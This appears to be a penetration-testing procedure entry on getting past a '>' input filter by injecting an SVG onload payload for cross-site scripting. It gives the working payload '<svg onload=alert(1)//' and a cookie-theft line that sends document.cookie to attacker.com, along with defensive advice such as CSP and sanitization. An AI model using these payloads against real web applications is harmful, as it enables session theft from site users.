---
id: bc98bb38-9232-450a-ae57-6b47fa871ca6
name: Bypass-Greater-Than-Filter-with-SVG-Onload-Alert
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:42.805108+00:00'
updated_at: '2023-04-10T20:21:44.266736+00:00'
tactics:
  - '[[Execution]]'
techniques:
  - '[[JavaScript]]'
sub_techniques: []
tags:
  - xss
  - filter-bypass
  - svg-payload
commands: []
platforms:
  - Web
tools: []
validated: true
---

# Bypass-Greater-Than-Filter-with-SVG-Onload-Alert

## Summary

This procedure demonstrates how to bypass web application input filters that block the '>' character by injecting an SVG element with an onload attribute to execute JavaScript, specifically triggering an alert for XSS testing. It targets reflected or stored XSS vulnerabilities where standard script tags are filtered, allowing attackers to execute code and potentially steal session data or perform other malicious actions.

## Description

In scenarios where web applications sanitize inputs to prevent XSS by stripping or blocking closing tags like '>', attackers can use SVG elements, which are XML-based and can embed JavaScript via event handlers like onload. This technique exploits the browser's rendering of SVG content to execute the onload event without needing a closing tag, evading simplistic filters. The payload is injected into user-controlled inputs such as search fields, comments, or profile fields. Upon rendering, the SVG loads and triggers the JavaScript, confirming the vulnerability. In a real attack, the alert could be replaced with code to exfiltrate cookies or keystrokes. This applies to modern browsers supporting SVG, assuming no additional Content Security Policy (CSP) restrictions on inline scripts.

## Requirements

1. Access to a web application with a reflected or stored XSS vulnerability in an input field.
2. Knowledge of the filter behavior, specifically that it blocks '>' but allows other characters.
3. A browser or tool like Burp Suite to test and observe the injection.
4. No administrative privileges required, only user-level input submission.

## Defense

- Implement comprehensive input validation and sanitization using libraries like DOMPurify to strip dangerous attributes and elements, including SVG and onload handlers.
- Deploy Content Security Policy (CSP) headers to restrict inline JavaScript execution (e.g., 'script-src 'self'').
- Regularly scan for XSS vulnerabilities using tools like OWASP ZAP or Burp Suite, and conduct code reviews focusing on XML/HTML parsing.
- Encode outputs properly (e.g., HTML entity encoding) to prevent script execution in rendered content.

## Objectives

1. Successfully inject and execute JavaScript without using the blocked '>' character.
2. Confirm XSS vulnerability by triggering an alert popup.
3. Demonstrate potential for data theft or further exploitation in a controlled test environment.

## Instructions

### Step 1: Identify the Vulnerable Input Field

**Context**: Locate an input field in the web application where user input is reflected back without proper sanitization, such as a search box or comment form. Test basic payloads like <script>alert(1)</script> to confirm the filter blocks '>' but allows partial injection.

No specific command required; use manual browser input or a proxy tool to submit and observe the response.

### Step 2: Craft and Inject the SVG Payload

**Context**: Use the SVG onload payload to execute JavaScript upon loading. This bypasses the filter by avoiding closing tags. Reference the payload code [[codes/SVG-Onload-JavaScript-Alert-Payload]].

Embed the payload directly into the input field:

```html
<svg onload=alert(1)//
```

Submit the form or input. The browser will parse the SVG and execute the onload event.

### Step 3: Verify Execution

**Context**: Observe the alert popup to confirm successful XSS. In a production test, replace alert(1) with document.location='http://attacker.com?cookie='+document.cookie to exfiltrate data.

Check the browser console or network tab for any errors. If no alert appears, inspect the rendered HTML to ensure the SVG is not further sanitized.

### Step 4: Test Variations and Cleanup

**Context**: If the basic payload fails, try URL-encoding parts of it or adjusting the comment (//) to evade additional filters. Document findings and report the vulnerability.

No command; manually clear inputs and avoid persistent storage of test payloads.
